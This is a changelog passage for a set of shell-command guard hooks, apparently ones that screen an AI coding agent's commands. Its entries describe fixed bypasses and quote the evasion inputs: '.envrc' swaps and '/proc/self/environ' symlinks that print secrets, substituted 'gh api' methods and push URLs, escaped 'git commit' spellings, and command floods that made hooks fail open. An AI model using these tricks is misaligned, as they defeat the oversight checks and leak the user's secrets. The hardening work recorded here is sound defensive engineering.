- **`warn-stacked-base-delete` and `guard-push-remote` stay inside the hook deadline on 200 KB floods.** A clone-and-push flood (`git clone <url> d && cd d && git push; cd ..;` repeated, or the `gh repo clone` form) took ~3.1 s in `warn-stacked-base-delete`, which failed open: every bare push paid two git config probes the delete check never reads. It now walks pushes without that probe, and a command deleting more than 8 branches nudges without querying. `guard-push-remote` took ~0.53 s on `cd a; ` ×40,000 before a push because each `cd` copied the whole path built so far; the push walk now extends the path in place, and the loop arm reuses the working directory instead of re-parsing it.
- **`strip_quotes` reads quote boundaries with the shared quote model.** Its private two-toggle scan ended `"a\"b"` at the escaped quote, so quoted prose after it leaked into every consumer's structure scan and the real closer reopened a phantom run that hid the next command: `warn-alias-parsing` nudged on `cat f | jq .` inside an escaped JSON string and stayed silent on a real `echo "a\"b" ; cat f | jq .`. `warn-alias-parsing` also strips heredoc bodies now, so a `cat f | jq .` written into one no longer nudges. A 16,632-cell old/new differential across twelve Bash guards moved no verdict from BLOCK to ALLOW. (cameronsjo/cadence-hooks#1035)

## [0.111.0] - 2026-09-29

### Security

- **`prevent-secret-leaks` no longer trusts a `.envrc` the same command can replace, nudges on `/proc/<pid>/environ`, and reads secret files out of `openssl -in=` and HTTPie `field@FILE` values.** The pure-loader carve-out classified the file before the command ran, so `mv .envrc.bak .envrc; cat .envrc`, `git stash pop; cat .envrc` and `ln -sfn /proc/self/environ .envrc && cat .envrc` printed a file it never checked; a multi-segment command now keeps the carve-out only when every segment is on an allowlist of commands that cannot replace a file (`cat`, `grep`, `ls`, `pwd`, read-only `git`, `direnv allow`/`reload`, `sed`/`awk` without in-place or file-writing programs, …) with no assignment in front of it and no unquoted file-writing redirect, attached (`x>y`) or spaced. A procfs environment read gets the `env`-dump nudge, on Bash and Read. `curl --data=@.env` is not a gap: curl rejects `--opt=value`. (cameronsjo/cadence-hooks#1078)
- **`guard-push-remote` judges a push against the URL a `-c` global sends it to, and a push flood no longer fails open.** `git -c remote.origin.pushurl=<url> push origin main` is judged against `<url>`; a `url.<base>.insteadOf`/`pushInsteadOf` rewrite, an `include.path`/`includeIf` file, a `--config-env` URL key, or a `$`-built value blocks as unreadable. The destination probe ran `git remote` once per push, so a 200 KB `git -C d push origin main; …` chain took 3 s and allowed; it now lists remotes once per directory (0.2 s). (cameronsjo/cadence-hooks#1131)
- **A substituted `gh api` method or push URL is no longer read as a safe GET or an owned remote.** `gh api -X $(echo DELETE) repos/x/y`, `-X "$M"`, and the attached `-XDELETE` / `--method=DELETE` spellings now count as writes, so the target is judged. A push destination carrying `$` or a backtick anywhere, such as `git push $(echo${IFS}https://github.com/<owned>/x)`, is never parsed as an owned URL: it nudges, and an unowned literal prefix still blocks. (cameronsjo/cadence-hooks#1139)
- **A quoted or escaped posting subcommand no longer skips the identity block.** The `redact-external-content` posting gate matched its command pattern against the quote-stripped segment while the body extractor read the tokenized one, so `git "commit"`, `git $'commit'`, `git c\ommit`, `gh pr "create"` and `gh -R o/r "issue" create` each deleted or split the subcommand from the gate's view and a work-identifiable term shipped past the fail-closed tier. The gate now also reads the argv the shell runs (quote- and escape-aware tokens, runner prefixes peeled, `git` globals and `gh -R` skipped) and admits a segment when either reading sees a post; `warn-overshare` shares the same gate. (cameronsjo/cadence-hooks#817)
- **`redact-scan`'s identity lines now strip control characters and cap length.** The `[identity:<id>]:<line>:<term>` stderr lines printed the term source's id and the matched term raw; both now go through the same sanitizer as the `custom` replacement (C0/DEL/C1 stripped, 120 characters), which is otherwise verbatim so the term stays actionable. (cameronsjo/cadence-hooks#828)
